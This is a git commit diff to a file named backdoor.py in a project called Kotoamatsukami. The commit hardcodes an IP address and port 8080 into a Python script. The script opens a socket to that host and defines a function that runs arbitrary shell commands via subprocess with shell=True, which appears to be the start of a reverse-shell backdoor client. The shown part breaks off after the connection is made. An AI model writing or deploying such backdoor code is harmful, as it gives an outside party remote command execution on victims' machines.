7cdd91d1fdb5faccf6cdaf1f80dbb2c575d158f5
RockBlet <belyakove31@gmail.com>
2022-12-23 06:11:48 +0300

    enter point and encode

--- Kotoamatsukami/backdoor.py
+++ Kotoamatsukami/backdoor.py
@@ -1,15 +1,15 @@
 import socket
 import subprocess
 
-ip: str
-port: int
-
 
 def execute_system_command(command):
     return subprocess.check_output(command, shell=True)
 
 
 if __name__ == "__main__":
+
+    ip = "192.168.20.146"
+    port = 8080
 
     connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     connection.connect((ip, port))
